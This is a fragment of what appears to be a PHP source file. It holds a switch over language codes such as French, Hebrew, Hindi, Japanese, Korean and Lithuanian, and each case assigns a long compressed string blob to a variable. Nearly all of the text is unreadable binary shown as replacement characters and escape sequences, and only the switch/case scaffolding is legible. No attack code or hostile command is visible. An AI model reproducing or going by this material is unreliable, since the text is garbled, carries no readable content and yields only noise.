�#��zJ:%�#����`�#�N���8ޗ={�)\$�JT�Đ3�4�L\0�2�P���I��<�c�\\5�Rj�.�@�:�I��\0�A(�׎èCQ\r�5�.c��A j��0���GƑ�>�	��N���P�\n��J7J�%>+#�;�\r�\\�\$Bh�\nb�8s�c��;�Uh���6�(a���¡�Ó����f9:��x�!�Sm[��3\r#:Z2��L#�\nR��a\0�'�e��Z�z��_�����,���^�_LL�\$Q`�&+��3���\$M��E3�-��/�[4�7ڠ�(�(#s���XD4�-�t�QK<��FR��x���ed��Tc�7%��`�/ɣd,Vj�f��!�����4h#����`����:=��z�\r:��2�\n�밆���`P�6!z<��HQ|��L�!�����0S�:ɭ�cJ٨��=������CBh8a�^���\\�u�]-��z��M�p���|��#\\��H�k��YI�޷P\$��~�������5�ڲL2��H��Al@�қ.�J&��\"&u��؆Wf�]��wn�;��N]��x��������Kp* �BG���,7���O��o!��\$�C�l����'����!ca���[�� ʸ����ai�0���&\rws�*9rjؗ��o,��wfW��K����Zs{�p�����\n	���v.�O \n (!3��3Ca\0�����	�;���\"R�JB˶��Y:E�EM��nd4!\0����i�����H�\$C�&d������&1gv,���rI�2��<��\\�Ji�N���㤀�)�D�=C�LH�bv���,�`�av&)� �N��EH�\0�[���(0�`��c�\r� ��B	��&�ܒ��������)O\"���	h�찂�E{	Fq���\"�)�{TK���],;�����:��D��̸�9-\"A@'�0�V�-�r�	�m�r�!��:C�ybD�7/��)��\$�e�����!��o\0�Bc\$�g�`��_n� �XKV��c	ɔ�\"HH��FPh\nO���'��[����y�K�ՃZ�D��z{�g�QC���'�d	vE,��(����~ (!���\nͻ�n� 9Q��N��CV%�z���!�T*M�q�!:d�0Ƞ`%ĥ���V�`Mɱ?��ӓc�Lѳ]1|��Y�N	Pu�Gt3\na��5ט�t&K�����Xk�I�T�z77:��шT��e�5w�V@�W AnQ�Qj��uC��r�J�꘏s8LI�T#^lPٴ6*���L�_�5��\na���O��&�O��m�~8̟���\n�����Gp��xA�'����%�l2<ո{\"�{��";break;case"fr":$f="%���(�m8�g3I��e�A��t2�����c4c\"�Q0� :M&���x�c�C)�;��f�S�F %9���ȄzA\"�O�q��o:��0�,�X\nFC1��l7AL4T`�-;T&�8̦�(2�D�Q��4E�&zd�A:�Φ脦�\$&�̆��fn9��',vn�G3��Rt��Bp��v2���62S�'I�\$�6�N��\r@ 5T#V����M�K��xrr�B��@c7�i�Xȃ%�:{=_S�L����\n|�Tn�s\r<���3�6΄��3��P�����\"�L�n�����7;�N15��h��#s\$����88!(�V֣p��7���F���P�2��Z��\$�\r�;C�(��2 (\n��)�`�E�p�6�L�\n\"(ê���(c@�a��\"\n!/�L�\nL��0��P��I쒜�B��8C��V�ʲ��D��=�s�n1)�.�E��k,�J4�!Qå ��O�գ)s���T����c�T����:A(�\r�0:5uaY7H*�4�Cs��xH�A��2�͒�4��C+\r�s:�JBJ�6u�YR��\$�ې��)�\0���@t&��Ц)�CP���h^-�7��.���p���\r��\0@6��p@*\0|���1s�0�!�^0��&�n�=\0002��9\"&�fP�������b��c�V�w���9�o��3΃E���R�\r�\\��� ���>ZT��\"`�x�k1�2I�����5.�_T�b#s�հ��p����/��r˦��F�B�;k|�*\rF�2n�%_��2H�3#*�3�/\r�Zl3\"���\0�2r���!��5�i����CCv8a�^��\\0��bF��~z���&��}�ԛ��c�V���RP�3C{N�m�N�6R��1\$�{�:��<QQ�� ����4T�����ú���<��i�y(7<�xϠh\"a�8*�R��K�#d�6�&���0a#�a��(��O�O>�B�!�eᥛ����\$f�+C56����\r���*{�&���6�e��VFI���ƉI�F��!���90<�)��Sʉ�[F��v�#*C\n (@��t�ࠠ#JR�Xs!!����JI��M���Ǔj�K�/�l�r���5/G��ҤH��3\r���ZU0yb���SX[�C%��E���uJk����oM��i&�\r�t��� T\r᭞�\0�FA�I�C��щ,m�����pQH�\r���?|�\"�.& 6��B	�\n�I��)�&�2��3��A�&ƔӶ�0�f�T8�X�KȜ���pF\$�����L�qS��� ��hD�Ҙ�\0�¡(k��3�PMN�i!�����J	Tڍ�	\rRE`d��}Tؓ�D���3��R!��o(�Ts\n�ћcP� �ox�t����A�\naD&\"24��u:���-�6Dȩ;�F��R��C���U>�V���=�R{Z��]1�T�#G�(L�����Oca�d�[-�(OI=����ǆ��U}��福�{h�q��¥�%Xc@���5j26���dH�*(��9E�i_�|Pg�by�I�B�F���*�\n�%��:<������bV6��K�E�!\$��(�DTzW�A�\0��b�.2�R�T1�&�}��D�\\s���+�5Dq��O�Lhr���`�Gh	2�)q/*@F��HB�R��\\Hũ�AB��e!\"J[�Fp�%YpxLu�j����AV�Y����\nR�l;(<,�|���+-e�\\�/�.\n��k�]E^1�6\n<��\\i�c�\$�E�)\r�V,��!�u���i�ܻ�z��wxo�@�M{��X2=�M�\rΒJ'��";break;case"gl":$f="%���(�o7j���s4���Q��9'!�@f4��SI��.��i����Xj�Z<d�H\$RI44�r6�N��\$z ��2�U:��c��@��59���\0(`1ƃQ��p9k38!��u��F#N�\n7��3Su�e7[�ƃ�fb7�eS%\n6\n\$��s�-��]BNFS����� ���z;bsX|67�0�·[����Vp�L>&PG��1��\n9����llh�E��]�PӒ�q��^�k��0�����&u��QT�*��uC�&&9J��Ӑ����: ����@���9�c��2%��#�&:��¸M2��2CI�Y�JP�#�\n���*�4�*��\r��?hҬ\r��!�)��!:����C*p(�����V���҇4��@7(�j6#�ç#�.j����3�!��\"��T�7��('�l�1��\0ƄN�ƃ�ʲ'�ã���\0�<�@MGR��J����^t�b�C�),�Z����)�.��1�qH\nc*'ZH���#<|	@t&��Ц)�C ���h^-�6��.���Z�\rÅE �X@6� x0�a�6َHK�#o8��|�\\�L�-���{DȪ��Q�\"�'Wa'qC� �D�S�� ��~ѥp�:&�ܔW#�R����D�2h�E�j! ���p)�?�Af#I�(�P��F�#p�E�H�����M�Q-j���1&}�h9�7����h|#:ǰ�(�嵲��EJk�B��4�4.�0!\0�2i)�}��	�9sǌ���C@�:�t��,H<��{\0��ꆄ�}п�U�{�R�?���ۗkHl&3B��c>8Z����3���N�ְP�?u݀\\qG�q܇%�rÿ1�:��]�s�w<<D��]\"J/C��V��h]��0S�\nO�|�<9�dM3mdId2�&�g�0����:J�k6J�sT��3�oE%/\0�V�;�O�03�@�9ׂ�4�FA\n5O�l�(��]X�DY�1&�A�R0�!���ۍ0P	@���b(()`�ܛ�BR�%�D�����}QOԑ0�PCS4�\rx���T^��Z�`BbMEX��b��s�\r�P�bf��&l��f؂����X7�k�b8�T4\"��C;�Q�P:B�Lڠ�o\rm!�0���2 Ђ\0��0�\"�%ߑԲ��k�6&��D0�M#g�M	�^T�]/'��\"^z#����TAZD̑��S\0jM�#C��5jș��\"�y�����g�pm�vf_R8�\$'�0��Y�7~����\$NHd��_DFq�����ƙ�&��:!��8�R':��8��I;*@�)��רb�%���	raB0T��Zj��Ч��2l�.���\"L~9ymN�Cy�'UJy�fb����iM�?\n�X \nRu�����mk}�VGj�QX�CJ!��9�hb��z�&8��qͨ蠨�=Èu\"� �'��HY��!!T*`Z	B�\$��S@b����q�D�A�1Kp�5v��� �U�.���+O��D�P�f*�2@)%�~{�\\'��=O�sgz\$5��6Ր�N��1���\$\0���21�o�{�z)���>M�9�3�	�>�ʢ�U�5A�Ԣ��AUͷ��\r0+��\"z�}XER;�E�kF�f\$��Cz{6 �\00063<F�";break;case"he":$f="%���)��k���ƺA��A��v�U��k�b*�m������(�]'���mu]2וC!ɘ�2\n�A�B)̅�E\"ш�6\\׎%b1I|�:\n���h5\r��;�*���bJ���u<UBk��0i�]?�F'1eTk�&�����G���~_��&�0�E�A�d��4�U��¤��M�B�����i~��ŕ�\"U �hn2\\+]���[��v�G�b�ҥE������(��ŷMƳq��nNG#y�\\\n\"N���e\r�S���t�N/���c��2<��\$\rC��6�\"��iJ\$�\"�k��'�*V��*Z��9гw3�r�k�(�@��s��5K��%��L�-LR�k��{0ͬ�<Z�\$��\$�3iH�6QC`��0b>�%�zZ�HhB��#dw-9�3����_\n1�����!)��\$�D�\"�A b�����΃�T�n19	.\n|��+�\"�:rbC@�z�!K�\$Bh�\nb�-�5(�.��h���%�l�,�D	�@6����)�|9���9<\r��#�x�!��^W��7�H�a��]��K���� �9��c�[<��r���[���2�Ø�i�p+,�����:\r��k&�m����`����8�-�:���IzN�8�J����,n:<�!��X�8�b��T�#8�):���v�!*��Г�PLu\$��h�2\r��ŔFȊ@�P��@4X0z\r��8a�^��]��#s�<�8_z��:^�p^�\n����|�,R�T�1,�Ԅ��:���s��\$����%H�\$�!�l���i#Q�j�.��kZ潰l[&��m;^�x�w����J(��	iG�\")�%��C����U!�����<nB��*=)%���%�*\r��1��@;�#`�O����(�2�C�y�O��1����:�c`�3����@ ��r>�@�\0d^��0���c��v�\\Q�,� ��@\$\0@\n	�)5*-�- �ٞ���7�\0��Hv|!�3��\\O��>���@���bMc\\�1�j��+�\$��ѮS���>�0�C�����qd8S��rNA�4��\0ZHgk/��E��U�e@��� bYS�a�l����yx\$�LP��\\#�!��H	;83e��FC!!����L:P&O������x�� ��Nf��z\$���[�ad�Dk�3�ňI��ъ�b\\�e3E\n<)�I,D��f12|�9#�0�\"̨�L7��L��K�L����p���B0�P��*A�JC��6��14��S+���ӎJ��wȎ\";�Jh˵���[\",j�Ig\$����`��d}�F)�T�H��O��S�K�+�!Dyś�nK���Q�M�QN)/4�`d#�0-y9�n�X�v5jT���4i�����ؿT�zKI<�pf�ɔN���dAoT��S�9�oL�#H�C	rSP���zY�Q��jΑt*��!f\"����&a�y%aJ�&�ʏ��\$	5J�1dQ! #�LNj`Cm4vy*b�y����FR��!ٺ���}N ";break;case"hi":$f="%���p�R��X*\n\n�AUpU��YA�X*�\n��\"��b�aTB�t��A���4!R���O_��I��Q@��q���*���`�j:\n�	Nd(����O)�������!�\"�5)RW��	|�`R�ő*�?R�T��DyKR�!\n�D�J��C�u\"�)�)Q�:����PT�i�5@�ݫ����-���u�e���Q���I��[�W8m�R[#�kn�H��U��)�a���%&�;�Rd��E\"��q�qo3��/%+��������x/���!��>覭T�o�Ϧ�#̣�#���o[���S�䧎B��h�(�������4�9�<��|6�B��A�Q\"\n��튜�:�bAí�k\n;h�N�G��+�#z��jx�9��(�/�,��	\"�zRCL�<�\nJ��ϻQ��7)��T6�@�\nZ�L�F���)H�E̢sB��	��[ȊΌ�/2��5*��e):h+IS��2ĨM6���*.ϲ��1R5豢���R�Bւ��s�O���(�J����\nr�Pɣ!���)%�Kd{R���E͚�;��(J��Jd)�EK���RG������=%��ya\"�/�P��5�szV��&�ݩ�O���Hu���-=E���\0�b����c1\\�8��ս��NY�:转����.t�!hH�A�]��S+q��4�.nծ�7��S�nͩG����M�^\"���2�q�Q��	@t&��Ц)�B��\"�Z6��h�2:��R4�I�SJ�*�|�ӄ�4HP/�\n�JtJP�}���o��-���wX0L��^9שa�s���]�\n���Ӥ\\��3�����]3����y���C�2�W)>2]�!�?U��N����ٌ���\r����#��\"� ����\"�D��`>��r�آ�*u{�N�M����\$ڔ�M?���>侚��>@���֨��49�\08b� �ц�+��G�NѬ\nYe<��4)�;��\nC2��z�6'E8�Wr�#J��\$���=���5]k�lk\n8�@�e�����s@��x��d\r��7P��xr�2��^xn!�4ǐ^�y�9���9�j��\n:�9�/�Lz�A2Cj����\nqJ]�:\"�h���r�1����d���FQ�Ȕ�\"ؒuZ'^�#׬=�g��Eu��.>\$��G]��Y��+E��\"�`�Q�3x��dn��:G`��uq�;'TT\nR���ͮ*�!e9~�NS#Sw!|9S爂�����#R4�>O\$V@�AD�2g�\$���jhm;=Fs�BCzj���!�\"��\r\"�DU��aJ�s�)b�NH���Bϐ�;���(�ޢ�x \n (*�:������Sω j�y�(�Ҥ�x�3�l?�D�ѹ�2%yϗ�G\$I�PfC�WJ	�j�8�ӆ������P\r���#Ӵ�~+��Ϫ�r+�o�s�T=sªL��>�����\0Pĕ�׉\"LeTQ2��!�0���\$�\n��a�qL9҆I9f���9<�-�C�c���T����SEg\n*5X���'�����H\"NDW���:�ryY�Emkh#T%[�\\w*�0@6�H��]j�w�ܴ�2�F�\"Ie	����l���2I\0�`H/�B�\0�£�\\�X��&l��-�{e�	(Wxd�bou����Y*h_�͒wb�R����F�G� @L�B�2�2��EqNZU�rm��9i�X��mE�UK\n�\"5��a}���Y>S�M�N��g�:NI���\"�����B�D��y�]���7�,�苺�Ω�C�ĂS꒮���RզW��0�p�����jr�3gƶY��PŰ�/;�-�%��q2�ZG�]k}�x�<F��U\n����h���[1�a��@q�f9��랶f|Kd�9�;3�C�q)/�%�i��Szy%>���\0̕(�ZrTǞ�Nf�ڪ޼T�OqH�`���}����g�+�Go��[?��Y��K�l�T����=Ls�r��vc��+����[ǨJ��������H�ki��N�Ɋ��Cb��v�ITEvB\$�ZS�\r�ʗ�.pg.��AFu�v��ہ�\r����G�ə�,�Psڗ7�,����ٌ7>�7���Z��3aFGq���@���?`5e���Ɨ;a���RÀ";break;case"hu":$f="%��k\rBs7�S��N2�DC���3M�F�6e7D�j���D!��i��M����Nl��NFS��K5!J��e�@n��\r�5I��z4��B\0P�b2��a��r\n!OGC|�� ��L5���\n�L��L<�n1�c���*)����)��`�k����56�L�ԁ��:'�T���d���2�ɼ� 4N�Z9�@p9NƓfK�NC\r:&h�D�7�,�� �*m�sw&kL��x�t��l<�7�c������V�Ag�b�=U��\n*GNT�T<�;�1�6B��5��x�73Ð�7�IP�޸o�X�6�*z9�C�����;��\"T����ʑ��R�&�XҧL���l���R��*\n����h\" Ȣ\$�\r##9�E�V��/�Bح�C�a�c�z�*.�6.���51*e,\$H�Z8�{��r\\�6L�Ԥ��`P��=3Ȅ�)����k��C�@9H+Y45\"q�4�#Γ��M+K���61S\0S���PH� iT� P���tA)��I\"v7.lS�5��YB:;�)bն� ��?����Cj�bK�t8��!cͼ<��p����9;Cb/J2jz)�|����0��P�<��x�%W��!��p�4��w~��`@�Őrhᶸt�\rأX���82�\np�9�8(�	���#lkJ���`�3ɚ��0C�V��o����{\\6��@:�c��1����:�7Pλ�ab&9h��0��66�㪜aK\0��]�:	P���i�͋ͯp@ ���y4���P����D4���9�Ax^;�pü�l3��\0^�c#�J7�}�7�v�;�@�0�*BzڍH5ѫ2���DQK;�]\rC��￑�_D�-�Jwp) ��p�G�q܀��r�`]��=A�d�/Cy	#h�����O�2,��%�&!�\"����oU�\$	�ʁ� l�5Ϣ�@ˑL;<ն�4�K@i8���0��( ������r2*X0�g��[Mi�D7�4�ɿ5�tȂ\0���@i!�����ڑyFK<����̓FP��C8�E\n�ke�Ă\0��@Fꂂ~�Ù%L7�.݋!�6&����,��A58(X����ˑ*b%��DS��#7��6���ɩ\$hu�0�fMawM�q�\"4ph �!�sY\$!�aM�N=��S̪aL)bF�)e2�pY��@�`l�X�;�^1�(i��ZKɉ32<�����K]��:����x�@���\n	\$<�`@I�B�K��NÈu0��3 �\$���H 1���o�\n�\r�ţ��V	�L*H#zA\0CV\"�5�C��\"�rg���DvՃ�Zh��'�HË9�)f`�LV_(PA�]NN��&�Q	����fI0T�+�K�OQy%���0���1�L�R\"�F�V����D�X�����M�G���BJ��YG%0؜�x�T��RU��r��Auq�5J�Wj�á�s�4�:I%!\r���-)��2/%A��E�'�p \n�P#�p���\r���)b�{�Cg��׫Ojj=�/����kVL�9)\$P�\$\\�j3_�����N�	\r6@�;EIK\nJ\0P�0Җ\0Q�F�����=ڻ���\nB� �D� ��rhAdZ���b(U�ze��-\"w9Ѐ\n	����ob:��<�1,Α53���c�}����9a�~e`�rU����*<�K�+�u\\�� �P��r��3/����׃��Lg7��P";break;case"id":$f="%���(�i2MbI��tL��9�(g0�#)��a9��D#)��r��c�1���M'�I�>na&�ȀJs!H���\0���Na2)�b2��a��r\n ��2�T�~\n5��f��*@l4���ц�a�\$E8��S4��'	��l�����d�u'c(��oF����e3�h���tƝ\r�y�/s4�a��U�U/�l'��Q�!7n�S>�S���/W���9�5�&n/x\n\$NX)\n3 ��Щx(�6ǝ�ӑ��\"\"C�i�ߚ��yӇ�!9���c\$��9:A*7;�#I0���X��\r��|��iR���(�ڑ+#:>�%�:068!\0�Amh�ɬ�j��BS�;�8�7�QZ�%\"m ���N�\"��H��B�����_\"�Bj@:�r�����ڗ�r�#i8��\"7#9��J1�PH�� g8��P�H��^�:m`�96��:\$R��,��4M�x��	К&�B��c�4<��h�6�� �D��>�'苨��\n~C,9'\r�O\0!�^0��[W�k �4���u^Bak	�����/0@���mSiU#(�/K\$(�� �\r�X�1	;7��2�7��:�\\bX�6�:7��r\"Ϙ�1����:ă`�3���X�C�r�Yv\\ʈ����aJ���K�H5���΃1I�X3ZN�x# ښ��x�o!�AV�5���C@�:�t�㾔'Y����8^���t���xDj�{yc׭jJ4�+���P,���i��JP~t�?O�<Mb��kpџh��iP�fY��9jZ��n\r:�EW�-S.����|�#�Y%�����&:=�,�8[�@%�@�3\$B��ƌ#���H�2(�Y-�0�p�X���Ne���۠�\n\${�N4��r\n2֥9���삀�(+���2uI�P��?��\$V�xwY@d���3ȟbXi�9\r�(;�T8���G~�4;Wn�VS� �9�,�ph�i5:gܐ7P䙃��di��v�J^��a��/��	�C\naH#?b�p 	m�԰f��\r�!�0�A�J,�Pڂ�(�m���bBE&dԛ���P i\rd�f\0��@�ɇ&)��2&��,V!�:�R �(mf%��p�Tvzh�0���z�\0P	�L*b:O�)\$Ǟ!T\0E\"�'*�%�9&Ɋ�\re��ܰ�) l����(fN�\n'D�3Ā�BdI�@�ʖ��bOYF��:8� H\"�#��\"��&JC�!2���7�5�!ǛH�\"�d�f��U3�YNB�;�(n\$L]��s@��4PU;\"��\n�@id,�K����\".yٱ\$�H�4Éh>,��0-L73t�E'�f0FL�N�DLM��\$AF�r\"Y��4��(���@Q���X%�,�Q�K�<� H�d��< ��K���)y���,[!5�\0(&�vO1�=Ur�Q�ztI��S܅5��,�l��2R#Ak��wOR�__1�\\nV�'clT!��4�6\"�H�ު��5#��";break;case"it":$f="%���(�a9Lfi��t7��S`��i6D�y�A	:��f���L0č0�q���L'9t�%�F#L5@�Js!I�1X�f7e�3��M&FC1��l7AE8Q��o���S|@o���&�dN��&(�fLM7�\r1xX(�-2�dF�}(�u�G�&s��4M\"��v�Z���g�Z-�(���J�.WCa�[���;fʒ 1�N���̧��ƭg<	� �g��J��er�K�DSd�׳&Z���QT�\"���H&�9�:�o�S!�W3�G#�s��ѩ8L�g{A�L�%,BR����P�%��&��J\"t��jh@�e:��H\"=�@�7�c�4�P���B�ʦ�B8�7��f*\r#�&���rI��`N���`��\"�����(��?���2�#�^7D�`޵#���KJ޲Ȋ(2��0J2�3\\�7�@R\\#�PH�� g>�(3�����D�|���X �ɂ�3�+`0�i��	@t&��Ц)�C ���h^-�5h�.�B��޺�����\"~\r���\n~4����6C�0�!�^0��5�a�h�.�u��l�=Cn2�\$�Mv��n�Ss���5]��l�4��ʙ�r0�2��3�,SI5�9����B����rB�ݳ��9=60ޗ%A\0�-�abʴ�f2���*�[�`��\$�N7�T�\\�+^'������c�v=�2�.E���d�-i�U�^��Ԍ�0����p�0���\r�0�ȍ�]�3-B\\7�\0�2er��<�r&9X	H����D4���9�Ax^;��u1��!r�3��p^2#��:�A� �7{E�h�i���\$T��0���ݡc�tɍ�&���/�i&͌�֑�*1�T���n���[���p\\ ��m�_Ņ�'<IH��XbH�8#3NO�ۚ�^Ek�#/#�v��3l� ��?@�^i�ʎB#�tܪm�JR���1B�u\\�I�����-���5r<Q��4#A��0ܕ��&��y ���M!�Jf� \"n�P��~�@\$O��=�h�RJ���GA��/P���#N����lf�j�p�;�ڗ�1�pt�B�\r��\"p���Db\")`ֻ�ݢ�P,1�C6YM b.������B�	�\n��5��@Rт	����Y�%/���P�j\$F���#g��f)����fy���D���{��ucD�J��.S	I�!���6���d2rX:�8���fl���+�\0P	�L*H�(W�AW(|�Jb��*X�A�5�b��jKp�	�'\$��9!�9,�&NJ0S\n!0�OVV��0T���6�l��rcsh���	��AL�U��\n �(��:&��:\"C�z�8g�3a�\\��ѕo4��G�m&0A֔�\nVq��INI�4�Ќd�9�\r��1�P���#ф�D�:K�{J�)��b�F��3�\r��JB�T��d�ZIM�N�8����U�l	J@\$�\rYu%'��F\\�Qx/U}R����\0R*5�T�U�ui\"�U��ʼ�\"����Қr�Dja�\$�x���0���7d�%DҦ�\\�T�ݓ\"��J�'���Vski��I��+oRЌ�W\"���҂D,��R5^P+	.u�Ę��u� ";break;case"ja":$f="%��:�\$\nq�Ү4�����(b�����*�J��q�T�l�}!M�n4�N �I*ADq\$�]HU�)̄ ���)�d����t'*�0�N*\$1��)AJ堡`(`1ƃQ��p99U��B�[�Hi�[�x�9�+��A�����FCw@�����~UM�����^�_�P�PU�!�� ���F^�!��UМR<����I'2mh�K,/P�[�P�t�R��W^�X��E�v��u:�k�L�[&|	��W�~G���*)A����m���4���TO;%�~s��C�\\�10G\$%R�eK�8myC�d~����\\��#�%{A�	Vr����_���L������(�Ce\$\$��i	\\se	�^�1R�e�&r@I	F��d	��	\n@ư���'H�Fĺ-:�´@��򘱜ĩ`���y.R���\\���DN�K���,�U1	)�dDK��)<E�p�A�F�%U%J!1�<A���M��SOҰ�0AJp�Q#�!�H�DFADMEB8A8T!Y��p���k#he��YI@B���f�J��D\0PJ2)�AK�U�g�! b������!8s���]�g1GҲu�t���B.\$Y+n�GI\\�T\0s��r�!L�����A��CH*-�9H�.��h���#Te��9�Exx0����B���4ݽD���}��AL@���&���pJ�Ą�:ʐ��y��T�>��FI�@�\$�.���vs��1Z\n[���\$\"H�D�&�&��\$���k��8D���ĮJ�^۷��IF�C`�9R���E��E�1 �^���\r�b\"�eEt�v�Y�I�c8��1�q��@��F�q�g)|�Ed1t%3M���ĵB���]���+�R� ��h�7�������SMnv�5�D�@���*�Jh(E�r�0P�� \r�2�`z�@t��9��^ü�������xr�2��`�pa���D��!'%���R�E�!�܄�Wxl���9\"A?���K]˥+kdZ=�,���ȑ\r�v�U��E)�ND#�Q�!LH8�?�B��	�p6�'`��n���!\$���<HJ�d&L�1�(�(��,�R�bC�GA:��P����7�S�P�Eøz�ș0r\r�I�Ĩڞ�n{��[� �<TN�N!�+R��{\"\r�D��%I�[��R�1\$\\��v|hU=�T��RX�I�E�8����H\nrk8)��K��(��-��H�t��B� �Vy�5ĸs��rq�����G168#�)�(M�X�Q�'���z}�t0lIX���5S\n)Oi)�B�8�D����F]q2�� �LD��Q\$k2�oĆ��W�#���m� �#%+���,&`��y�*�S\nA���F���-�Ht��C���.`��uR��|ڦ��\"hS�bSXIIֈ-�]|�����&9ECY�RX6Ƞ�\0S�}Qپ�Rl�9D��+ʪD�聫�u%��(�������|�Թ��H���\n���	�L*�h�P�ĭ���w���m�C(m�(APM��\r�-���N[�lm�W#�n��k��f�K(�-.�\r\naD&W����,!*�-Db%%��Y�V)���`��c�U��:�����>��i�(��V��6f�ޛ�`c(�	J�@h�.��irQQM�8\r6����lvI�JQ�>&\"��\$:10�^&�H�	 �0-\$�|	wk#V\\�\\�����s&%���Ę�����ˏ�\"5k�4(���3Fp�Ce��x��Q�!2�1���fw��� �#�_��|G�a��D�F��(|ϩ	���\\�c{堅�Ha<'S.�E��Q<9�ø�3���,�`�Uj��m���r�}/��s�\\Xxҗg��Q�S&�@C�Mg�";break;case"ka":$f="%���)RA�t�5B�������Pt�2'K¢�:R>�����5-%A�(�:<�P�SsE,I5A���d�N����i�=	  ��2�i?��cXM���\"�)�����v���@\nFC1��l7fIɥ	'��\"�1��Ud�J�	���.������e�iJ��\"|:\r]G�R1t�Y��g0<�SW�µ�K�{!��f�����eM�s���'Im&�K������=e��\"�r'����Q+������˿���}��-�����<�^��}nnZ,�:�K<թ�;��SV�\"�z����q=o�۳*#�\0�LD�����ζ�S����:�-JsL�\"���4M�i(N\".�@�9Z�7�����B�Ŵϻ����&��V��l��7RR��r�F\n���K�t�-Y(�˰Kp�D��LΣ*�x�#	�������Sj2S!��R�L,���*�ʐi��DO/����ۊ��j\r�1��Ч��K����;h� �J1���JR-E#�M;���-jʠ'��V�Fm�z���D:�GM�6Ҽ����`��T��J�O(H�� gr�)��Q�o\n�Dؕ\n3)͕a��J���0T��N�T\"P�R�I(I[�<S�m���ք4Ƥ�/���\r�����-�-�D.��>�a\0�:�c�@*�|9���9\r�\0Ü�#��0�!�^0�Ɏa�cx�3\r#>n2�Z\$�\r9ʧ\$��}��J9Kii�Jҳ�����L�*��a�3(�\r��咥����)�/(��M4�H)ri:![u�C�锵7o8�֋�J�9m:�KxW�C���mG!��T�Z͵��{A��^#uM&�Z@�[8˦�F�½�V�Cڛ�s���חP�4�G~����#.#܌�\"�6�(�+Q�|��?��j�R���S����V�����\0њ��D4�����/�������r��9p^Cp/�(0�@�ҁx\"�mc��nFM��Qh���V(nz�t/5�g�s�*�O��Z��2mΙ��u8I��R��~�.ߕy7FN������v)#C��YI��\\�_�e/����\0�,{��@���e�8/A2�p�&�ƹ	aYYQoM1CÊ��bT'L�\"2��S��%��6�b5:f�?�כ���S�%E��ڼB)'���B���y%�j��<�V��C��<W��	^�5��8��!TT/�I;�.�R��a��,��*��'Q�h�U�����Hq�h%�تf��&�<@\n\n�)4��b�s�,\"�~QRb<D�Eܛ%(�P���t�C�-��·I�����7N�P:I���4�\"\r�wX&'�Uy��jV���[MJ�C\"�2����A�+�ck\"��|'Y�\nLt��aE�0��3ܥB\ro���IV��o���%f�j�D:H�x�JO�(ے����4�+³�W}La�8�d]IB��X!ɺ���\"ZYWbZ<J	��SI��]j���)'}F�У�1�|/꾳���Z5���U���Yg��ʳ�I�s��T\"�dڕ�%E�eh��&���P��sF�%ۚ.�JR�A���Nm}��vb�K�M��ɠ��6�RV���qYnM���A0[J��2m�CE5=�-KJ!*�6�l�V�2������	(J�ۭ�^��Z�x�� �\0M+)G\"��9�5�V��Z��šI[CH>�jp��͈��@�x��:yӴl=j�WZ����b�~�ں��N�֘!� �\n����]�^�/US!4�Rj�IҀ��TW[����D�T� ��,�A�!'SI�lY�����D���5�Tg�!�8���ibS�v���pv0��\")�M�E�y���Ku����҅��v�b���?��Uc��6?Qy?D�P�h�]h����.��7V�<[w�2)�(��u/\"BM6@�1a�`���D��VI��P���Y��Ru Î�g&Z%E���	�+����-�e���y���g5�I-��]��n��*M�ҩpDX";break;case"ko":$f="%��b�\nv�������%Ю�\nq֓N�U����������)ЈT2��;�db4�V:�\0��B��ap�b��Z;���aا�;���O)��C��f4����)؋R;RȘ�V��N:�J\n���\\��Z��KRSȈb2̛H:�k�B��u��Y\r֯h������!a���/\"�]�d�ێ��ri؆�&�XQ]���n:�[##i�.�-(�Y�\nR���O)i����gC#cY��Nw�����	NL��-����\0S0��&�>yZ�P',�l�<V��R\n�p�7\r�����7�IX�0���0�c(@2\r�(�A�@9����DC�09���Ƞ�\$�����aHH����AGE)x�P����v	RX���3bW�#�gaU�D�̸=�\"�V3d� ��b�S��Y���a6�'�0J�I�`��S���A\0�<���K�\$�(v����\0�2�bSM+����e�v�b(����:�I	�Z�v��6�\"�U:�1��Zu�EK�S���I;A(��\r�h��SXA b����Υ��A�+�TT\"��J�eX�8��{-�+Z�BiN�������a/,��tu�� t������\"�Z6��h�2/��uD�q�	t]D�E��\$�^��h�9�A�Ð�:��0��p�<��x�%x�@!��p�4��(˖��@�Ɛ��9��d4��7h�<?�i(�:�p�4棚WZ(��6���\$���u���B�9'a�SM[W���6A�B��7�nP<���:�c<9�è�\r�x���ad�9p�0�}��c��aN���{��A��yb��SԲ�P�4e\\>3iX��3��6�po\$1�#H���@4dC0z\r��8a�^���\\0��#�~�Ú`�\r�xD|��w�f;6B��mo\\�u� ��z�r	Q�-�V)�<oKrE^�!%�0��*h� ��K\"E�\$0����ދ�z�]�w��Cr\rρ�>�����}L�\$���уkU���C��z����4QJ\roФ7BV۟�1*	�1�D���I)\"UU+���]�+vhh0�7��A\0w\r!�ņ\$4�C��P�_���p�Mĸ���\\j���4!��A\0c�P�4��ֈB19��?�R��H\njIPO�I�Mc�\\���`rS*��C��t)���?7���I�h��2��N��hh�7�)�C����y\n�v:āSj��)\nș����8f~���G\r���%���4�0��;��B!��X�e�s6g�@R�hC.�nD��0R@CdId9�@���2&\0���\"���#\$Țb6���G��~Ax�t'��������:���z.�I!�:���1\r�\nv!�DC�DA���{\nD�Aa�ơ�	0�T�%a@'�0�yQ�Q�AJa�\"��@�ZV�&���r)��B�X#�@�u\r�.����w��J�0��-m\$�#@�_�h�u�\$K��\"Dȩ�Ұ��_�#n#4t��1i��1Jn�\0*�ի�����ao\rZ�k���κD������\\�����7K�|{��Q�Z����t�PCl!�����K'�GUj�bi�\$����c��q\0�0-\r-�Gwu%�#F���jAɓ�\$ט�ep���7Ԩ��HY���N������:���:�xv��NgL��Wђ��E �&�#��)�\r����ņ&�`c[�Q[��M����U�|Q�J-�]a�@EeDlgq��L�#�B��֪�[Lߋ*�,���\"��fܺW\\��Y�S�~�ِtC0�h(�W�tؙ#�DkFZ�\$�-5��\ri�4kU7�d�H�B%��";break;case"lt":$f="%���(�e8NǓY�@�W�̦á�@f0�M��p(�a5��&�	��s��cb!��i�DS�\n:F�e�)��z���Q�: #!��j6� ����r���T&*���4�AF��i7IgPf\"^� 6M�H��������C	��1Պ��\0N���E\r�:Y7�D�Q�@n�,�h���(:C����@t4L4��:I���'S9��P춛h���b&NqQ��}�H؈PV�u��o���f,k4�9`��\$�g�Ynf�Q.Jb��fM�(�n5�����r�GH���t�=��.� ���9�c��2#�P��;\r38�9a�P�Cbڊ�˱f��i�r�'������5�*���?o�4ߍ��`���*B��� �2�C+��&\n��5�((�2��l����P�0�MB5.�8҄����5�+*O+K҈��q������ޗ���ʑ\rC���\n	